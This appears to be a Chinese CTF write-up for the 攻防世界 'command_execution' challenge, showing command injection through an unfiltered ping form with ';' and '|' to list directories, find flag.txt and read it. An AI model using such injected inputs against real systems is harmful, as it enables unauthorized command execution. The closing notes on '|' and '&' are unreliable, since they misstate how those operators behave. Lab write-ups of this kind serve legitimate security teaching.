---
title: CTF攻防世界入门题单WriteUP-adworld-10
date: 2024-11-19
tags:
 - CTF
 - adworld
 - WriteUP
categories:
 - 随笔 Essay 
isShowComments: true
publish: true









---

<Boxx/>

根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第10题

[[toc]]

- 题单【[传送门](https://adworld.xctf.org.cn/challenges/problem-set-index?id=25)】
- 官方WriteUP视频【[传送门](https://www.bilibili.com/video/BV1rz4y137dF/)】

| 题目编号 | 题目名称          | 题目方向 | 难度 |
| -------- | ----------------- | -------- | ---- |
| GFSJ0484 | command_execution | Web      | 2    |

<!-- more -->

# 题目10：  command_execution

### 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。

### 考点1：Linux基础

### 考点2： 熟悉     |     的作用（命令拼接）

### 解题思路1：使用命令拼接找到flag相关文件

> 题目描述中提到的WAF
>
> ‌**WAF是Web Application Firewall的缩写，即Web应用防护系统。**‌它是一种专门为Web应用提供保护的产品，通过执行一系列针对HTTP/HTTPS的安全策略来防止恶意攻击
>
> WAF的工作原理是通过规则匹配来执行防御动作，例如IP和URI黑白名单、DDoS防护、请求与响应过滤等功能。WAF可以部署在应用层，看到应用层的报文内容，从而实现更深入和细致的审核和过滤。
>
> WAF的应用场景非常广泛，适用于金融、电商、O2O、互联网+、游戏、政府、保险等行业，主要用于保护各类网站的Web应用安全。用户可以通过购买云服务或部署开源项目如ModSecurity来使用WAF。
进入靶场，我们尝试输入127.0.0.1并点击ping按钮

![image-20241119215338499](/img/essay/image-20241119215338499.png)

根据题目描述的提示，这里没有写waf，并且我们根据Linux基础得知，Linux系统中，是可以同时执行两条命令的，比如分号“;”，我们拿如下命令举个例子：

```shell
ping -c 3 127.0.0.1 ; ls
```

![image-20241119220217702](/img/essay/image-20241119220217702.png)

这里我们可以看到是先执行了ping命令，后执行了ls命令。而如果我们不想执行前一句命令，只执行后一句命令，我们可以使用管道符号，也就是	“|”	。

```
ping -c 3 127.0.0.1 | ls
```

![image-20241119220444748](/img/essay/image-20241119220444748.png)

由此作为理论支撑，我们可以在刚才的网页尝试使用命令拼接的方式来执行我们想要的命令。

```shell
ping -c 3 127.0.0.1|ls
index.php
```
我们此时可以直接查看根目录，甚至不需要写前面的ip地址。
```shell
ping -c 3 |ls /
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
run.sh
sbin
srv
sys
tmp
usr
var
```

一般情况下，可以直接找/home目录下有没有我们的目标文件，如果没有的话，可以使用命令来查找文件。

```
ping -c 3 127.0.0.1 | find / -name "flag.txt"
/home/flag.txt
```

然后我们用cat命令去查看flag.txt文件的内容，即可得到flag。

```
ping -c 3 |cat /home/flag.txt
cyberpeace{ee296471d2544681c19c1ec9bd4a24c5}
```

> 掌握有关命令执行的知识 windows 或 linux 下: 
>
> command1 && command2 先执行 command1，如果为真，再执行 command2 
>
> command1 | command2 只执行 command2 
>
> command1 & command2 先执行 command2 后执行 command1 
>
> command1 || command2 先执行 command1，如果为假，再执行 command2

